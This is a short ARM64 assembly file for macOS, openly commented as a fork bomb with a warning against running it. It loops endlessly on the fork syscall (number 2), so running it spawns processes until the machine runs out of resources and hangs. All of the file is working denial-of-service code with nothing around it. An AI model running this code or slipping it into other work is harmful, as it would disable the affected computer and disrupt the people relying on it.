; just don't run this, it's a forkbomb for macos arm
; Syscall number 2 is fork
.global _start
.align 2

_start:
    mov X16, #2
    svc #0x80
    b _start
